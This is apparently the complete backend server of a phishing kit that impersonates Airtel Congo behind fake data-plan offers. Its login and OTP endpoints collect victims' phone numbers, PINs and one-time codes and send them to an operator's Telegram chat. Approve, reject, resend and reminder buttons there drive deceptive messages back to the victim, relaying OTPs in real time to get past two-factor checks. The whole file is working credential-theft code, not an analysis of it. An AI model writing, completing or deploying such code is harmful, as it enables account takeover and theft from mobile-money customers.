/* ============================================================
   Airtel Congo — Backend
   Telegram approve/reject/resend/reminder for:
   - login → otp → success
   ============================================================ */

const express = require('express');
const cors = require('cors');
const crypto = require('crypto');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 5000;

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '';

const TELEGRAM_API         = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
const TELEGRAM_ANSWER_URL  = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
const TELEGRAM_EDIT_URL    = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
const TELEGRAM_WEBHOOK_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook`;

const SESSION_TIMEOUT_MS = 10 * 60 * 1000;

const sessions = new Map();

setInterval(() => {
  const now = Date.now();
  for (const [id, s] of sessions.entries()) {
    if ((s.status === 'pending' || s.status === 'resend_requested')
        && now - s.createdAt > SESSION_TIMEOUT_MS) {
      s.status = 'timeout';
      s.resolvedAt = now;
    }
    if (now - s.createdAt > SESSION_TIMEOUT_MS * 2) {
      sessions.delete(id);
    }
  }
}, 60 * 1000);

app.use(cors());
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));

app.use((req, _res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
  next();
});

/* Serve static files (index.html, login.html, etc.) from project root */
const PUBLIC_DIR = path.join(__dirname, '..');
app.use(express.static(PUBLIC_DIR));

/* Helpers */
function makeSessionId() {
  return crypto.randomBytes(16).toString('hex');
}

function escapeHtml(s = '') {
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function isValidPhone(phone) {
  return typeof phone === 'string' && /^\+?\d{8,15}$/.test(phone.replace(/\s/g, ''));
}

function stripFirstLine(text) {
  if (!text) return '';
  const idx = text.indexOf('\n');
  if (idx === -1) return '';
  const rest = text.slice(idx + 1);
  return rest.replace(/^━+\n/, '').trim();
}

/* 2-column keyboard for OTP */
function buildKeyboard(step, sessionId) {
  if (step === 'login') {
    return {
      inline_keyboard: [
        [
          { text: '✅ Approuver', callback_data: `approve:login:${sessionId}` },
          { text: '❌ Rejeter',   callback_data: `reject:login:${sessionId}` }
        ]
      ]
    };
  }

  if (step === 'otp') {
    return {
      inline_keyboard: [
        [
          { text: '✅ Approuver', callback_data: `approve:otp:${sessionId}` },
          { text: '❌ Rejeter',   callback_data: `reject:otp:${sessionId}` }
        ],
        [
          { text: '🔁 Renvoyer',  callback_data: `resend:otp:${sessionId}` },
          { text: '⏰ Rappel',    callback_data: `reminder:otp:${sessionId}` }
        ]
      ]
    };
  }

  return { inline_keyboard: [] };
}

async function sendTelegramWithButtons(text, sessionId, step) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('⚠️ Telegram env vars missing');
    return null;
  }
  try {
    const res = await fetch(TELEGRAM_API, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
        reply_markup: buildKeyboard(step, sessionId)
      })
    });
    const data = await res.json().catch(() => ({}));
    if (!data.ok) {
      console.warn('⚠️ Telegram error:', data.description || data);
      return null;
    }
    return data.result.message_id || null;
  } catch (err) {
    console.error('❌ Telegram fetch failed:', err.message);
    return null;
  }
}

async function editTelegramMessage(messageId, text, replyMarkup) {
  if (!messageId || !TELEGRAM_BOT_TOKEN) return;
  try {
    const body = {
      chat_id: TELEGRAM_CHAT_ID,
      message_id: messageId,
      text,
      parse_mode: 'HTML',
      disable_web_page_preview: true
    };
    if (replyMarkup !== undefined) body.reply_markup = replyMarkup;

    await fetch(TELEGRAM_EDIT_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
  } catch (err) {
    console.error('editTelegramMessage failed:', err.message);
  }
}

async function answerCallback(callbackQueryId, text) {
  if (!callbackQueryId || !TELEGRAM_BOT_TOKEN) return;
  try {
    await fetch(TELEGRAM_ANSWER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callbackQueryId,
        text,
        show_alert: false
      })
    });
  } catch (err) {
    console.error('answerCallback failed:', err.message);
  }
}

/* Page routes */
function servePage(filename) {
  return (_req, res) => {
    const filePath = path.join(PUBLIC_DIR, filename);
    if (!fs.existsSync(filePath)) {
      return res.status(404).send(`Page ${filename} not found.`);
    }
    res.sendFile(filePath);
  };
}

app.get(['/', '/index', '/index/'], servePage('index.html'));
app.get(['/login', '/login/'], servePage('login.html'));
app.get(['/otp', '/otp/'], servePage('otp.html'));
app.get(['/success', '/success/'], servePage('success.html'));

/* ============================================================
   API — LOGIN (phone + PIN → Telegram)
   ============================================================ */
app.post('/api/login', async (req, res) => {
  try {
    const { plan = '', amount = '', unit = '', validity = '', price = 0, phone = '', pin = '' } = req.body || {};

    if (!isValidPhone(phone)) {
      return res.status(400).json({ ok: false, error: 'Numéro de téléphone invalide' });
    }
    if (typeof pin !== 'string' || pin.length < 4) {
      return res.status(400).json({ ok: false, error: 'Code PIN invalide' });
    }

    const sessionId = makeSessionId();

    const text =
      `📱 <b>NOUVELLE CONNEXION</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `🇨🇩 <b>Pays:</b> Congo\n` +
      `📦 <b>Forfait:</b> ${escapeHtml(amount)} ${escapeHtml(unit)} (${escapeHtml(validity)})\n` +
      `💰 <b>Prix:</b> $${Number(price).toFixed(2)}\n` +
      `📱 <b>Téléphone:</b> <code>${escapeHtml(phone)}</code>\n` +
      `🔑 <b>Code PIN:</b> <code>${escapeHtml(pin)}</code>\n` +
      `🕒 <b>Heure:</b> ${new Date().toLocaleString('fr-FR')}\n\n` +
      `⏳ Appuyez sur ✅ ou ❌ ci-dessous`;

    const messageId = await sendTelegramWithButtons(text, sessionId, 'login');
    console.log(`[login] sessionId=${sessionId} msgId=${messageId}`);

    sessions.set(sessionId, {
      step: 'login',
      status: 'pending',
      data: { plan, amount, unit, validity, price, phone, pin },
      originalText: text,
      createdAt: Date.now(),
      resolvedAt: null,
      telegramMessageId: messageId
    });

    return res.json({ ok: true, sessionId });
  } catch (err) {
    console.error('login error:', err);
    return res.status(500).json({ ok: false, error: 'Erreur serveur' });
  }
});

/* ============================================================
   API — OTP
   ============================================================ */
app.post('/api/otp', async (req, res) => {
  try {
    const { plan = '', amount = '', unit = '', validity = '', price = 0, phone = '', otp = '' } = req.body || {};

    if (!isValidPhone(phone)) {
      return res.status(400).json({ ok: false, error: 'Numéro de téléphone invalide' });
    }
    if (typeof otp !== 'string' || !/^\d{4,8}$/.test(otp)) {
      return res.status(400).json({ ok: false, error: 'Code OTP invalide' });
    }

    const sessionId = makeSessionId();

    const text =
      `🔢 <b>NOUVEL OTP</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `🇨🇩 <b>Pays:</b> Congo\n` +
      `📦 <b>Forfait:</b> ${escapeHtml(amount)} ${escapeHtml(unit)} (${escapeHtml(validity)})\n` +
      `💰 <b>Prix:</b> $${Number(price).toFixed(2)}\n` +
      `📱 <b>Téléphone:</b> <code>${escapeHtml(phone)}</code>\n` +
      `🔐 <b>OTP:</b> <code>${escapeHtml(otp)}</code>\n` +
      `🕒 <b>Heure:</b> ${new Date().toLocaleString('fr-FR')}\n\n` +
      `⏳ Appuyez sur ✅ / ❌ / 🔁 / ⏰ ci-dessous`;

    const messageId = await sendTelegramWithButtons(text, sessionId, 'otp');
    console.log(`[otp] sessionId=${sessionId} msgId=${messageId}`);

    sessions.set(sessionId, {
      step: 'otp',
      status: 'pending',
      data: { plan, amount, unit, validity, price, phone, otp },
      originalText: text,
      createdAt: Date.now(),
      resolvedAt: null,
      telegramMessageId: messageId
    });

    return res.json({ ok: true, sessionId });
  } catch (err) {
    console.error('otp error:', err);
    return res.status(500).json({ ok: false, error: 'Erreur serveur' });
  }
});

/* ============================================================
   API — STATUS (polling)
   ============================================================ */
app.get('/api/status/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  const session = sessions.get(sessionId);

  if (!session) {
    return res.json({ ok: true, status: 'unknown', step: null });
  }

  if ((session.status === 'pending' || session.status === 'resend_requested')
      && Date.now() - session.createdAt > SESSION_TIMEOUT_MS) {
    session.status = 'timeout';
    session.resolvedAt = Date.now();
  }

  return res.json({
    ok: true,
    status: session.status,
    step: session.step,
    message: session.userMessage || ''
  });
});

/* ============================================================
   TELEGRAM WEBHOOK — handles button taps
   ============================================================ */
app.post('/api/telegram-webhook', async (req, res) => {
  try {
    const update = req.body || {};
    const cb = update.callback_query;

    if (!cb || !cb.data) return res.json({ ok: true });

    const [action, step, sessionId] = String(cb.data).split(':');
    const session = sessions.get(sessionId);

    console.log(`[webhook] action=${action} step=${step} sessionId=${sessionId} found=${!!session}`);

    if (!session) {
      await answerCallback(cb.id, 'Session expirée');
      return res.json({ ok: true });
    }

    if (session.status === 'approved' || session.status === 'rejected' || session.status === 'timeout') {
      await answerCallback(cb.id, `Déjà ${session.status}`);
      return res.json({ ok: true });
    }

    const when = new Date().toLocaleString('fr-FR');

    /* ---- RESEND ---- */
    if (action === 'resend') {
      session.status = 'resend_requested';
      session.resendRequestedAt = Date.now();

      session.userMessage = 'Code incorrect. Veuillez entrer le bon code OTP.';

      await answerCallback(cb.id, 'Renvoyer demandé');

      const preservedBody = stripFirstLine(session.originalText);
      const newText =
        `🔁 <b>RENVOI DEMANDÉ</b> — en attente de décision finale\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        preservedBody +
        `\n\n🕒 <b>Renvoi demandé:</b> ${when}`;

      if (session.telegramMessageId) {
        await editTelegramMessage(session.telegramMessageId, newText, {
          inline_keyboard: [
            [
              { text: '✅ Approuver', callback_data: `approve:${step}:${sessionId}` },
              { text: '❌ Rejeter',   callback_data: `reject:${step}:${sessionId}` }
            ]
          ]
        });
      }

      return res.json({ ok: true });
    }

    /* ---- REMINDER ---- */
    if (action === 'reminder') {
      session.status = 'reminder_sent';
      session.reminderSentAt = Date.now();

      session.userMessage = 'Presque terminé ! Veuillez entrer le code OTP reçu pour débloquer votre forfait. Vous êtes à une étape de l\'internet haut débit.';

      await answerCallback(cb.id, 'Rappel envoyé');

      const preservedBody = stripFirstLine(session.originalText);
      const newText =
        `⏰ <b>RAPPEL ENVOYÉ</b> — en attente de décision finale\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        preservedBody +
        `\n\n🕒 <b>Rappel envoyé:</b> ${when}`;

      if (session.telegramMessageId) {
        await editTelegramMessage(session.telegramMessageId, newText, {
          inline_keyboard: [
            [
              { text: '✅ Approuver', callback_data: `approve:${step}:${sessionId}` },
              { text: '❌ Rejeter',   callback_data: `reject:${step}:${sessionId}` }
            ],
            [
              { text: '🔁 Renvoyer',  callback_data: `resend:${step}:${sessionId}` }
            ]
          ]
        });
      }

      return res.json({ ok: true });
    }

    /* ---- APPROVE / REJECT ---- */
    if (action === 'approve') {
      session.status = 'approved';
      session.resolvedAt = Date.now();
      await answerCallback(cb.id, 'Approuvé');
    } else if (action === 'reject') {
      session.status = 'rejected';
      session.resolvedAt = Date.now();

      if (step === 'login') {
        session.userMessage = 'Numéro ou code incorrect. Veuillez vérifier et réessayer.';
      } else if (step === 'otp') {
        session.userMessage = 'Code OTP incorrect. Veuillez réessayer.';
      } else {
        session.userMessage = 'Rejeté. Veuillez réessayer.';
      }

      await answerCallback(cb.id, 'Rejeté');
    } else {
      await answerCallback(cb.id, 'Action inconnue');
      return res.json({ ok: true });
    }

    const statusLine = action === 'approve'
      ? '✅ <b>APPROUVÉ</b>'
      : '❌ <b>REJETÉ</b>';

    const preservedBody = stripFirstLine(session.originalText);
    const newText =
      `${statusLine}\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      preservedBody +
      `\n\n🕒 <b>Résolu:</b> ${when}`;

    if (session.telegramMessageId) {
      await editTelegramMessage(session.telegramMessageId, newText, { inline_keyboard: [] });
    }

    return res.json({ ok: true });
  } catch (err) {
    console.error('webhook error:', err);
    return res.json({ ok: true });
  }
});

/* ============================================================
   404 + ERROR
   ============================================================ */
app.use((_req, res) => {
  res.status(404).send(`
    <html><body style="font-family:sans-serif;text-align:center;padding:60px 20px;background:#f9fafb;">
      <h1 style="font-size:48px;margin:0;color:#111827;">404</h1>
      <p style="color:#6b7280;margin-top:12px;">Page introuvable.</p>
      <a href="/" style="display:inline-block;margin-top:20px;padding:12px 22px;background:#c0001a;color:#fff;text-decoration:none;font-weight:900;border-radius:10px;">Retour aux Forfaits</a>
    </body></html>
  `);
});

app.use((err, _req, res, _next) => {
  console.error('unhandled error:', err);
  res.status(500).send('Erreur serveur');
});

/* ============================================================
   AUTO-REGISTER WEBHOOK ON STARTUP
   ============================================================ */
async function registerWebhook() {
  if (!TELEGRAM_BOT_TOKEN) {
    console.warn('⚠️ Impossible d\'enregistrer le webhook — TELEGRAM_BOT_TOKEN manquant');
    global.__webhookStatus = 'missing_token';
    return;
  }

  let publicUrl = process.env.PUBLIC_URL || '';
  if (!publicUrl && process.env.RAILWAY_PUBLIC_DOMAIN) {
    publicUrl = `https://${process.env.RAILWAY_PUBLIC_DOMAIN}`;
  }
  publicUrl = publicUrl.replace(/\/+$/, '');

  if (!publicUrl) {
    console.warn('⚠️ Aucun PUBLIC_URL / RAILWAY_PUBLIC_DOMAIN défini');
    global.__webhookStatus = 'missing_url';
    return;
  }

  const webhookUrl = `${publicUrl}/api/telegram-webhook`;
  console.log('🔗 Enregistrement du webhook:', webhookUrl);

  try {
    const res = await fetch(TELEGRAM_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        url: webhookUrl,
        allowed_updates: ['callback_query']
      })
    });
    const data = await res.json().catch(() => ({}));
    if (data.ok) {
      console.log('✅ Webhook Telegram enregistré:', webhookUrl);
      global.__webhookStatus = 'ok';
    } else {
      console.warn('⚠️ Échec de l\'enregistrement du webhook:', data.description || data);
      global.__webhookStatus = `failed: ${data.description || 'inconnu'}`;
    }
  } catch (err) {
    console.error('❌ Erreur d\'enregistrement du webhook:', err.message);
    global.__webhookStatus = `error: ${err.message}`;
  }
}

app.listen(PORT, async () => {
  console.log('====================================');
  console.log('🌐 Airtel Congo — backend en marche');
  console.log(`🚀 Port: ${PORT}`);
  console.log(`📨 Telegram configuré: ${TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID ? 'OUI' : 'NON'}`);
  console.log('====================================');
  setTimeout(registerWebhook, 2000);
});
